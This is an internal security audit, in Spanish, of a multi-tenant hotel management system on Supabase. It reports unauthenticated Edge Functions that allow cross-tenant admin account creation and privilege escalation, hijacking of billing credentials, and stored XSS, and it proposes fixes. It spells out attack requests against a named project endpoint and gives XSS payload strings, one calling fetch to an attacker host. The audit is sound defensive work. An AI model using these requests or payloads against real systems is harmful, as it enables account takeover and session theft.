# 07 — Seguridad y aislamiento multi-hotel (RLS)

Fecha del corte: 2026-09-07. Rama auditada: `integracion-posthog` (basada en `main`).

> **Estado posterior al corte (2026-09-11):** los hallazgos 3.1 y 3.2 fueron corregidos y probados en A4/A5. El frontend usa ahora los helpers centrales en contenido y atributos, y el preview publicado fue verificado. La evidencia actual está en [16-estado-implementacion.md](16-estado-implementacion.md#a4--a5--xss-almacenado-en-clientes-y-usuarios).

## Alcance y limitación de evidencia

Esta auditoría es de código estático sobre las 127 migraciones versionadas en
`supabase/migrations/`, las Edge Functions en `supabase/functions/`, y el frontend en
`js/`. **No hay acceso MCP en vivo a Supabase (staging ni producción)**: todo lo que
sigue asume que las migraciones versionadas reflejan lo desplegado. Esa suposición está
razonablemente respaldada aquí (ver siguiente sección), pero solo una consulta directa a
`pg_policies`/`pg_proc` en producción, o un nuevo release gate como los de
`docs/security/`, puede confirmarlo con certeza.

## 0. Continuidad con la auditoría previa (pre-Fase 14)

Ya existían cuatro documentos de auditoría/gate: `docs/supabase-rls-audit.md` (snapshot
2026-08-25, **desactualizado**, generado antes del hardening) y la cadena
`docs/security/pre-fase14-rls-audit.md` → `pre-fase14-release-gate.md` (bloqueado por
RPC cross-tenant) → `pre-fase14-release-gate-v2.md` (GO candidate) →
`pre-fase14-function-acl-release-gate.md` (aprobado en staging). Verifiqué lo siguiente
contra el código actual:

- La migración `20260827174036_pre_fase14_function_acl_and_cross_tenant_hardening.sql`
  (la "migración 10" de los gates) **está presente y no ha sido modificada ni
  sobrescrita** por ninguna migración posterior. Contiene el cierre de privilegios por
  defecto (`alter default privileges ... revoke execute ... from public, anon,
  authenticated`), la reconstrucción de `actualizar_compra_y_detalles` y
  `cambiar_habitacion_transaccion` con validación de `auth.uid()` → `hotel_id` propio
  antes de tocar cualquier fila, el `drop` del overload legacy vulnerable de
  `cambiar_habitacion_transaccion`, y el cierre a `service_role`-only de
  `decrementar_stock_producto` y `crear_habitacion_con_tiempos`. Código verificado
  línea por línea (ver `supabase/migrations/20260827174036_...sql:13-138` y `:141-276`
  y `:400-403`) — las dos vulnerabilidades cross-tenant demostradas en el release gate
  v1 **están corregidas en el código versionado**.
- El historial de migraciones continúa inmediatamente después con trabajo etiquetado
  `fase14_auditoria_acciones_conciliacion` y `fase15_minimos_privilegios_conciliacion`
  (2026-08-28) y sigue sin interrupción hasta 2026-09-05, lo que indica que el equipo
  trató el hardening de pre-Fase 14 como una base ya asentada, no como un paquete
  todavía pendiente de aplicar. Esto es evidencia indirecta (no una consulta en vivo) de
  que se promovió a producción.
- Revisé todas las funciones `SECURITY DEFINER` nuevas creadas **después** de esa
  migración 10 (energy control, conciliación bancaria, búsqueda de clientes similares,
  mantenimiento, horarios, tarifas programadas). Todas las que reciben o derivan un
  `hotel_id` lo validan contra `auth.uid()` → `usuarios.hotel_id` antes de leer o
  escribir (ver sección 2). No encontré una regresión al patrón cross-tenant que motivó
  el hotfix de pre-Fase 14.
- Todas las tablas nuevas creadas después de la migración 10 (`mantenimiento_historial`,
  `mantenimiento_configuracion`, `mantenimiento_alertas_emitidas`,
  `horario_configuracion`, `horario_plantillas_turno`, `horario_solicitudes`,
  `horario_borradores`, `horario_borrador_asignaciones`, `tarifas_programadas_habitacion`,
  `mantenimiento_planes`, `mantenimiento_plan_alertas_emitidas`,
  `mantenimiento_tarea_habitaciones`) tienen `ENABLE ROW LEVEL SECURITY` en el mismo
  archivo que las crea, con policy de `hotel_id = get_current_user_hotel_id()`. No hay
  tablas nuevas sin RLS.
- `docs/supabase-rls-audit.md` (37 tablas sin RLS, incluidas `pagos`, `bitacora`,
  `referidos`) quedó **obsoleto**: es un snapshot de antes del hotfix. El estado real
  post-hotfix, confirmado por `pre-fase14-release-gate-v2.md`, es 0 tablas sin RLS en
  staging (108 tablas, 164 políticas, 11 tablas con RLS pero sin política — principalmente
  catálogos/vistas de solo lectura por diseño). Recomiendo archivar o marcar como
  histórico ese primer documento para que nadie lo use como estado actual.

**Conclusión de la Parte A "clásica" (RLS/tablas/RPC legacy):** sin hallazgos nuevos que
agregar a lo ya documentado y corregido. El trabajo real de esta auditoría está en la
sección 1 (Edge Functions) y la sección 3 (frontend), que **no estaban cubiertas** por
los gates de pre-Fase 14 (esos se enfocaron en Postgres: RLS, políticas y `SECURITY
DEFINER`, no en las Edge Functions con `service_role`).

## 1. Hallazgo crítico nuevo: Edge Functions con `service_role` sin ninguna validación del actor

Los gates de pre-Fase 14 endurecieron exhaustivamente el ACL de funciones de Postgres,
pero las Edge Functions corren fuera de ese perímetro: usan la `service_role` key (que
by-pasea RLS por completo) y son responsables ellas mismas de autenticar y autorizar al
llamador. Encontré **tres funciones activas, con consumidor real en el frontend, que no
validan la identidad del llamador en absoluto** — aceptan `hotel_id`/`usuario_id`
directamente del cuerpo JSON de la petición y operan con `service_role`.

### 1.1 `crear_colaborador` — creación de cuentas de staff sin autenticación (CRITICAL)

- **Archivo:** `supabase/functions/crear_colaborador/index.ts`
- **Consumidor real:** `js/usuarios-crear-colaborador-hotfix.js:61` (`supabase.functions.invoke('crear_colaborador', ...)`), enlazado desde el módulo de usuarios.
- **Línea aproximada:** 12-100 (todo el handler).
- **Riesgo:** La función nunca lee ni valida el header `Authorization` del llamador — no hay `auth.getUser()`, ni verificación de rol, ni de que el `hotel_id` recibido corresponda al hotel del que llama. Toma `correo`, `password`, `nombre`, `hotel_id` y `roles` (array de `rol_id`) literalmente del body y, usando la `SERVICE_ROLE_KEY`, ejecuta `supabase.auth.admin.createUser(...)` (con `email_confirm: true`, o sea la cuenta queda utilizable de inmediato) y luego inserta en `public.usuarios` y `public.usuarios_roles` con el `hotel_id` y los `roles` que vengan en el payload, sin comprobar que existan ni que sean coherentes con nada.
- **Verificación de exposición:** `supabase/config.toml` no declara `verify_jwt = false` para esta función, así que Supabase exige *algún* JWT válido firmado por el proyecto — pero la **anon key pública** (la misma que está hardcodeada en `js/supabaseClient.js:10`, `PRODUCTION_SUPABASE_ANON_KEY`) es en sí misma un JWT válido firmado por el proyecto. Por lo tanto, `verify_jwt = true` no exige un usuario logueado: cualquier visitante anónimo con la anon key pública (que ya está en el bundle del frontend) puede invocar esta función directamente por HTTP.
- **Escenario real concreto:** un atacante externo, sin cuenta ni sesión, hace `POST` directo a `https://iikpqpdoslyduecibaij.supabase.co/functions/v1/crear_colaborador` con `Authorization: Bearer <anon key pública>` y body `{ correo, password, nombre, hotel_id: "<uuid de cualquier hotel>", roles: ["<uuid del rol Administrador de ese hotel>"] }`. El `hotel_id` de un hotel víctima es obtenible (aparece en URLs de la tienda pública `obtener_catalogo_tienda_web(uuid)`, en el menú de terraza público, o simplemente probando UUIDs conocidos de clientes del SaaS). El `rol_id` de "Administrador" es un catálogo global (`roles`, con SELECT público para `authenticated`, y potencialmente adivinable/enumerable). Resultado: el atacante obtiene una cuenta de Administrador funcional dentro del hotel de la víctima, con acceso total a caja, reservas, usuarios y reportes de ese hotel — sin haber tenido nunca credenciales legítimas.
- **Contraste con el patrón correcto ya existente en el propio repo:** `supabase/functions/manage-user-lifecycle/index.ts:43-99` sí implementa el patrón correcto — extrae el Bearer token, llama `admin.auth.getUser(token)`, carga el perfil del actor, exige `isHotelAdmin(actorProfile)`, y compara `actorProfile.hotel_id` contra el hotel del usuario objetivo antes de permitir la operación. `crear_colaborador` debería seguir exactamente ese mismo patrón.
- **Corrección propuesta:** exigir `Authorization` del actor, resolver su perfil en `usuarios`, exigir rol admin activo, forzar `hotel_id = actorProfile.hotel_id` (ignorar cualquier `hotel_id` del body), y validar que cada `rol_id` en `roles` pertenezca a una lista permitida (nunca aceptar el ID de "Administrador"/"superadmin" sin una comprobación explícita adicional, igual que ya hace `manage-user-lifecycle` para el owner del hotel).
- **Severidad: CRITICAL.** Bypass total de autenticación con creación de cuentas admin cross-tenant.

### 1.2 `actualizar_permisos_usuario` — escalación de privilegios cross-tenant sin autenticación (CRITICAL)

- **Archivo:** `supabase/functions/actualizar_permisos_usuario/index.ts`
- **Consumidor real:** `js/modules/usuarios/usuarios.js:591` (pantalla de "Permisos" del módulo de usuarios).
- **Línea aproximada:** 32-98 (todo el handler).
- **Riesgo:** Igual patrón: toma `usuario_id` y `permisos` (array de `{permiso_id, checked}`) directamente del body, sin leer `Authorization` ni comprobar quién llama, y con `service_role` hace `upsert`/`delete` sobre `public.usuarios_permisos` para el `usuario_id` indicado — que puede ser cualquier usuario de cualquier hotel, incluyendo el propio atacante.
- **Escenario real concreto:** un usuario autenticado de bajo privilegio (p. ej. una camarera) — o incluso un anónimo con la anon key pública, por el mismo argumento del punto 1.1 — llama a esta función con su propio `usuario_id` y `permisos: [{permiso_id: "<uuid del permiso 'usuarios.administrar' o 'caja.eliminar'>", checked: true}]`. La función inserta esa excepción de permiso directamente en `usuarios_permisos` sin verificar que quien pide el cambio tenga autoridad para concederlo. El resultado es una escalación de privilegios horizontal/vertical dentro del propio hotel (un recepcionista se auto-concede permisos de administrador) sin dejar rastro de que fue el propio usuario quien se los otorgó.
- **Corrección propuesta:** mismo patrón que `manage-user-lifecycle`: resolver el actor desde el JWT, exigir que sea administrador activo del **mismo hotel** que el `usuario_id` objetivo, y registrar auditoría (`bitacora`) de quién modificó los permisos de quién.
- **Severidad: CRITICAL.** Escalación de privilegios sin autenticación efectiva, en el módulo que controla justamente el sistema de permisos.

### 1.3 Familia `alegra-*` — credenciales de facturación de terceros por `hotelId` sin autenticación (HIGH)

> **Estado posterior al corte (2026-09-11): corregido, probado y desplegado en Supabase staging.** Se creó un límite de confianza compartido para `alegra-save-config`, `alegra-test-connection`, `alegra-crear-factura` y la ruta lateral `alegra-zapier-notify`. Las cuatro validan un JWT de usuario con Supabase Auth, exigen membresía activa en el `hotelId` solicitado y solo obtienen `service_role` después de autorizar. Las tres acciones del panel exigen además administración del mismo hotel; la notificación operativa exige membresía activa. Los cuerpos, UUID y origen se validan, y las respuestas/logs ya no exponen detalles de base de datos, usuario de Alegra ni cuerpos de proveedores. Las cuatro están `ACTIVE` en staging como versión 1 y con `verify_jwt=true`; solicitudes remotas sin JWT o con un token malformado devuelven 401. La aceptación con usuarios reales y producción siguen pendientes. Ver [16-estado-implementacion.md](16-estado-implementacion.md).

- **Archivos:** `supabase/functions/alegra-save-config/index.ts`, `alegra-crear-factura/index.ts`, `alegra-test-connection/index.ts` (mismo patrón en los tres).
- **Línea aproximada:** todo el handler en cada archivo; el guard relevante es `alegra-save-config/index.ts:63-65` y equivalentes.
- **Riesgo:** Estas funciones sí implementan un allowlist de `Origin`, pero el guard es `if (origin && !ALLOWED_ORIGINS.has(origin)) return 403`. Como la condición solo actúa **cuando `origin` no es null**, cualquier cliente que no sea un navegador (curl, un script, un `fetch` sin modo `cors` desde un entorno sin navegador) simplemente no envía cabecera `Origin`, y el chequeo se salta por completo — no hay ninguna verificación de sesión/JWT del llamador ni de que el `hotelId` del body corresponda a nada. `alegra-save-config` permite sobreescribir `facturador_usuario`/`facturador_api_key` en `integraciones_hotel` para cualquier `hotelId`; `alegra-crear-factura` y `alegra-test-connection` permiten usar las credenciales de Alegra guardadas de cualquier hotel para hacer peticiones salientes a la API de Alegra.
- **Escenario real concreto:** un atacante llama `alegra-save-config` con el `hotelId` de un hotel víctima y su propia cuenta/API key de Alegra, secuestrando la integración de facturación de ese hotel (las facturas del hotel víctima empezarían a crearse — o fallar — contra la cuenta de Alegra del atacante). Alternativamente, llama a `alegra-crear-factura`/`alegra-test-connection` con el `hotelId` de la víctima para usar sus credenciales de Alegra ya guardadas como oráculo (confirma si existen credenciales configuradas y ejecuta peticiones autenticadas contra la cuenta de Alegra de la víctima).
- **Corrección propuesta:** agregar la misma validación de actor+hotel que en `manage-user-lifecycle`, y no depender de `Origin` como control de autorización (es un control de navegador, no de autorización de servidor).
- **Severidad: HIGH** (impacto financiero/reputacional vía integración de terceros, pero no da acceso directo al hotel como los dos anteriores).

### 1.4 CORS `Access-Control-Allow-Origin: "*"` en funciones de gestión de usuarios (LOW, en presencia de 1.1/1.2)

> **Estado posterior al corte (2026-10-01): corregido, probado y desplegado en Supabase staging.** `crear_colaborador`, `actualizar_permisos_usuario`, `manage-user-lifecycle` y la función deshabilitada `delete-user` comparten una allowlist explícita para producción y desarrollo local. Los orígenes web ajenos reciben 403 antes de ejecutar la acción, las respuestas declaran `Vary: Origin` y los clientes servidor-a-servidor sin `Origin` continúan sujetos a la autenticación normal. Las cuatro funciones están `ACTIVE` como versión 2 y con `verify_jwt=true`; preflights remotos confirmaron 200 para orígenes permitidos y 403 para un origen ajeno. Producción sigue pendiente.

- **Archivos:** `delete-user/index.ts` (deshabilitada, retorna 410 — sin riesgo), `crear_colaborador/index.ts:7`, `actualizar_permisos_usuario/index.ts:5`, `manage-user-lifecycle/index.ts:5`.
- **Riesgo:** CORS abierto en funciones que gestionan cuentas es una mala práctica — normalmente de bajo riesgo real porque estas APIs usan Bearer tokens (no cookies), así que otro sitio web no puede "robar" la sesión solo por CORS. Pero combinado con 1.1 y 1.2 (que ni siquiera necesitan un token de sesión real), el CORS abierto es irrelevante para esos dos casos y solo relevante como higiene general. `manage-user-lifecycle` sí valida el actor correctamente, así que ahí el CORS abierto es un defecto menor, no una vulnerabilidad explotable por sí solo.
- **Corrección propuesta:** una vez corregidos 1.1 y 1.2, restringir `Access-Control-Allow-Origin` a la misma allowlist que ya usan las funciones `alegra-*` (`gestiondehotel.com`, `www.gestiondehotel.com`, hosts de desarrollo local).
- **Severidad: LOW** (defensa en profundidad, no explotable de forma aislada).

## 2. Funciones `SECURITY DEFINER` nuevas (post pre-Fase 14) — bien diseñadas

Revisé cada `SECURITY DEFINER` creada después de la migración 10 con consumidor cliente
(`grant execute ... to authenticated`):

- **Control de Energía** (`supabase/migrations/20260901213000_energy_control_hardening.sql`): `energy_capabilities`, `energy_list_qr_tokens`, `energy_scan`, `energy_confirm`, `energy_regenerate_qr`, `energy_cancel`. Todas derivan el `hotel_id` del actor desde `auth.uid() → usuarios.hotel_id` (nunca lo reciben como parámetro no verificado) y el secreto del QR vive en `private.room_energy_qr_secrets`, un esquema con `REVOKE ALL FROM public, anon, authenticated` — solo accesible vía estas funciones `SECURITY DEFINER`, con el token acotado por `hotel_id = v_user.hotel_id` en cada `JOIN`. Diseño correcto.
- **Conciliación bancaria** (`20260828024228_fase15_minimos_privilegios_conciliacion.sql:13-42`): `app_private.bank_email_user_has_pilot_access(p_hotel_id uuid)` valida `u.hotel_id = p_hotel_id and u.id = auth.uid()` antes de conceder acceso — no confía en el parámetro por sí solo.
- **Búsqueda de clientes similares** (`20260902234130_clientes_identity_search_and_merge_backup.sql:25-120`): `buscar_clientes_similares` es `SECURITY INVOKER` (no `DEFINER`), por lo que aunque recibe `p_hotel_id` sin comprobarlo internamente, la política RLS de `clientes` (`clientes_tenant_select`, con `USING (hotel_id = get_my_hotel_id())`) se aplica igual sobre la sesión del llamador — pedir el `hotel_id` de otro hotel simplemente devuelve 0 filas. Diseño correcto (delega el aislamiento a RLS en vez de duplicarlo).
- **Mantenimiento** (`20260902032500_mantenimiento_fase1_hardening.sql`, `20260902043500_..._flujo_trazable.sql`): `mantenimiento_transicionar_tarea` y `mantenimiento_agregar_comentario` son `SECURITY INVOKER` y dependen de las políticas RLS explícitas de `tareas_mantenimiento` (`hotel_id = get_current_user_hotel_id()` en SELECT/INSERT/UPDATE/DELETE, ver `20260902032500_...:100-119`), que sí existen y están activas. Mismo patrón correcto que el punto anterior.

No encontré ninguna función nueva que reciba `hotel_id` como parámetro de un `SECURITY
DEFINER` y lo use sin validar contra `auth.uid()` — el patrón que motivó el hotfix de
pre-Fase 14 no se repitió en el trabajo posterior.

## 3. Frontend — XSS almacenado por `innerHTML` sin escapar

`js/security.js` expone `escapeHtml`, `escapeAttribute` y `sanitizeUrl`, y están **usados
de forma consistente** en los módulos más críticos que revisé a fondo: `reservas.js`
(cliente, notas, reglas de tarifas — todo pasa por `escapeHtml`), `caja-movimientos.js`
(concepto, nombres de usuario/método de pago) y `room-card.js` (nombre de habitación,
cliente actual, artículos). Ese es el patrón correcto y está bien extendido.

Sin embargo, encontré dos módulos donde el mismo dato se renderiza escapado en un lugar
y sin escapar en otro dentro del mismo archivo — lo que confirma que es una omisión, no
una decisión de diseño.

### 3.1 `js/modules/clientes/clientes.js` — nombre/documento/teléfono de cliente sin escapar (HIGH)

- **Archivo:** `js/modules/clientes/clientes.js`
- **Función/líneas:** el render de la tabla de clientes, líneas 668-684, y el selector de cliente para reservas, líneas 1516-1524.
- **Riesgo:** `cli.nombre`, `cli.documento` y `cli.telefono` se interpolan directamente en `innerHTML` como texto (`<td>${cli.nombre || ''}</td>`, línea 674) y, más grave, **dentro de un atributo HTML sin comillas de escape** (`data-nombre="${cli.nombre}"`, líneas 668-669 y 1519). Un valor de `nombre` que contenga una comilla doble cierra el atributo y permite inyectar HTML/atributos arbitrarios, p. ej. `nombre = 'x" onmouseover="alert(document.cookie)' ` o `nombre = 'x"><img src=x onerror=fetch(atacante)>'`. A diferencia de un `<script>` inyectado (que el navegador no ejecuta al insertarse vía `innerHTML`), un atributo de evento como `onerror`/`onmouseover` **sí se ejecuta** en cuanto el elemento se inserta en el DOM.
- **Escenario real concreto:** el nombre de un cliente lo captura el personal de recepción al registrar una reserva o una venta (no hay validación de caracteres especiales en el formulario de alta de cliente). Un huésped que dicta su nombre, o un recepcionista malicioso/comprometido, puede dejar un `nombre` con este payload. La próxima vez que un administrador (u otro recepcionista) abra el módulo de Clientes, o abra el selector de cliente al crear una reserva, el payload se ejecuta en la sesión de esa persona — pudiendo robar el token de sesión de Supabase (almacenado en `localStorage`, mismo origen, accesible por JS) y escalar a una cuenta de mayor privilegio dentro del mismo hotel.
- **Corrección propuesta:** envolver `cli.nombre`, `cli.documento`, `cli.telefono` con `escapeHtml` (contenido de texto) y con `escapeAttribute` (valores de atributos `data-*`), tal como ya se hace en `reservas.js` y `caja-movimientos.js`. `clientes.js` ni siquiera importa `security.js` actualmente.
- **Severidad: HIGH.**

### 3.2 `js/modules/usuarios/usuarios.js` — nombre/correo de la propia tabla de usuarios sin escapar (HIGH)

- **Archivo:** `js/modules/usuarios/usuarios.js`
- **Función/líneas:** `renderUsuariosTable` (aprox. líneas 658-680) — nótese que el mismo archivo define `escapeUsuariosHtml` (línea 55) y lo usa correctamente en otra vista (línea 203, "top de ventas"), pero **no** en la tabla principal de usuarios.
- **Riesgo:** `u.nombre`, `u.correo` y `rolesNombres` se insertan como texto sin escapar (línea 664-666), y además `u.nombre`/`u.correo` se repiten sin escapar dentro de atributos `data-nombre`/`data-correo` en los botones de acción (líneas 675-677: "Reset Pass", "Permisos", "Eliminar").
- **Escenario real concreto:** este es el módulo de gestión de usuarios/staff — exactamente el módulo que la regla crítica del proyecto (RLS por `hotel_id`, roles) protege a nivel de base de datos, pero que aquí queda expuesto a nivel de UI. El campo `nombre` se define al crear la cuenta (vía `crear_colaborador`, ver 1.1, o por el propio usuario si existe autoregistro/onboarding). Un `nombre` malicioso persiste y se ejecuta cada vez que un administrador abre la pantalla de Usuarios para gestionar personal — un vector directo de robo de sesión de administrador, en el módulo con más poder de todo el sistema.
- **Corrección propuesta:** aplicar `escapeHtml` a `u.nombre`, `u.correo` y `rolesNombres`, y `escapeAttribute` a cada atributo `data-*` que los reutilice. La implementación posterior eliminó el helper local duplicado y usa directamente los helpers centrales de `js/security.js`.
- **Severidad: HIGH** (agravado por ser el módulo de administración de cuentas/permisos).

### 3.3 Riesgo menor: nombres de catálogo en `<option>` (LOW, no explotable en la práctica)

`descuentos.js`, `limpieza.js`, `restaurante.js`, `tienda/inventario.js` interpolan
`.nombre` de catálogos internos (categorías, roles, ingredientes, artículos de
lencería/inventario) sin escapar dentro de `<option>...</option>`. En la práctica el
`innerHTML` de un `<select>`/`<option>` se parsea en un contexto de solo texto — no
acepta hijos elemento (`<img>`, etc.) — por lo que este patrón, aunque inconsistente con
el resto del código, no es explotable como XSS de la forma en que sí lo son 3.1 y 3.2.
Lo señalo como deuda de consistencia, no como vulnerabilidad, así que no ocupa una
severidad de la matriz de seguridad.

## 4. Guards y sesión — bien diseñados, sin hallazgos

- `js/authService.js`: contrato único `{event, session, user}`, deduplica `INITIAL_SESSION`, limpia `localStorage`/`sessionStorage` solo de las claves de auth (`AUTH_STORAGE_KEY`, `sb-*-auth-token`) al cerrar sesión. `requireAuth()` (líneas 68-75) solo verifica que exista un usuario logueado y redirige a `/login.html`; **no** hace control de rol — eso se delega correctamente a cada módulo/las policies RLS, es un patrón razonable siempre que cada módulo sensible imponga su propio chequeo de rol antes de renderizar acciones (lo cual verifiqué que hacen `manage-user-lifecycle` del lado servidor, y RLS del lado de datos).
- `js/user-active-session-guard.js`: sondea cada 30s (y en focus/visibilitychange) si `usuarios.activo` sigue en `true`; si un admin archiva al usuario mientras tiene sesión abierta, se le cierra la sesión localmente y se le redirige. Es un control de UX, no el límite de seguridad real — el límite real es `manage-user-lifecycle` (`ban_duration` en Supabase Auth + `activo=false` con RLS), que si está bien implementado (ver sección 5).
- No se encontraron archivos `.env` versionados, claves `service_role`, tokens `sk_`, ni API keys de terceros hardcodeadas en `js/` o HTML servidos al navegador. Las únicas claves presentes en el frontend son las **anon keys** de producción y staging en `js/supabaseClient.js:10,12` — es el uso esperado y seguro de esa clave (su seguridad depende de que RLS y las Edge Functions validen todo lo demás, que es justamente donde están los hallazgos de la sección 1).
- Nota menor (LOW, no vulnerabilidad): `js/supabaseClient.js:14-20` permite cambiar el backend activo (`production`/`staging`) vía `?backend=staging` en la URL, persistido en `localStorage`, sin ningún control de autorización. No filtra datos ni RLS (staging es un proyecto Supabase distinto y aislado), pero permite que un enlace manipulado cambie silenciosamente contra qué entorno opera la víctima. Bajo impacto; documentar o gatear a un flag de desarrollo si se quiere eliminar el ruido.

## 5. Qué está bien diseñado (para no perder de vista en futuras refactorizaciones)

1. **El hardening de pre-Fase 14 se sostiene.** La migración 10 (ACL por función +
   corrección de `actualizar_compra_y_detalles`/`cambiar_habitacion_transaccion`) sigue
   vigente, no fue revertida ni debilitada por ninguna de las ~50 migraciones
   posteriores, y el equipo ha seguido escribiendo funciones nuevas (energía,
   mantenimiento, horarios, conciliación bancaria) que replican correctamente el patrón
   `auth.uid() → usuarios.hotel_id`, o delegan en RLS vía `SECURITY INVOKER` cuando no
   necesitan bypasear políticas. Es una base sólida y el patrón está internalizado en el
   código nuevo.
2. **`manage-user-lifecycle`** (`supabase/functions/manage-user-lifecycle/index.ts`) es
   el ejemplo a copiar para 1.1/1.2: valida el JWT del actor contra Supabase Auth, carga
   su perfil, exige rol admin activo, compara `hotel_id` del actor contra el del objetivo
   (con excepción explícita y acotada para superadmin), y protege al propietario del
   hotel de ser retirado por error. Además maneja consistencia (revierte el `ban` si
   falla la escritura en `usuarios`, y viceversa).
3. **`escapeHtml`/`escapeAttribute`/`sanitizeUrl`** en `js/security.js` son correctos y
   están bien adoptados en los módulos más críticos por volumen de tráfico (reservas,
   caja, mapa de habitaciones) — el problema no es la herramienta, es cobertura
   incompleta en dos módulos puntuales (clientes, usuarios).
4. **Aislamiento por esquema `private`/`app_private`** para secretos operativos (tokens
   QR de Control de Energía, backups de fusión de clientes, helpers de conciliación
   bancaria): `revoke all ... from public, anon, authenticated` a nivel de esquema, con
   acceso exclusivamente a través de funciones `SECURITY DEFINER` acotadas. Es el patrón
   correcto para secretos que no deben ser ni siquiera legibles por `authenticated`
   directo.

## Resumen de severidades

| # | Hallazgo | Severidad | Estado |
| --- | --- | --- | --- |
| 1.1 | `crear_colaborador` sin autenticación — creación de admin cross-tenant | CRITICAL | Abierto |
| 1.2 | `actualizar_permisos_usuario` sin autenticación — escalación de privilegios | CRITICAL | Abierto |
| 1.3 | Familia `alegra-*` — `hotelId` sin autenticación, credenciales de terceros | HIGH | Abierto |
| 3.1 | `clientes.js` — XSS almacenado (texto + atributo `data-nombre`) | HIGH | Abierto |
| 3.2 | `usuarios.js` — XSS almacenado en la tabla de gestión de usuarios | HIGH | Abierto |
| 1.4 | CORS `*` en funciones de gestión de usuarios | LOW | Corregido y verificado en staging; producción pendiente |
| — | `?backend=staging` sin control de autorización | LOW | Informativo |
| — | RLS/RPC de Postgres (pre-Fase 14) | — | Ya corregido, verificado vigente |

**Prioridad de corrección recomendada:** 1.1 y 1.2 primero (autenticación completa
ausente en funciones con `service_role`, explotable por cualquier persona con la anon
key pública ya distribuida) — esto es más urgente que cualquier otro hallazgo de esta
auditoría, incluidos los ya cerrados de pre-Fase 14. Luego 3.1/3.2 (XSS en dos módulos
concretos, corrección mecánica de una función ya existente). Luego 1.3 y 1.4.
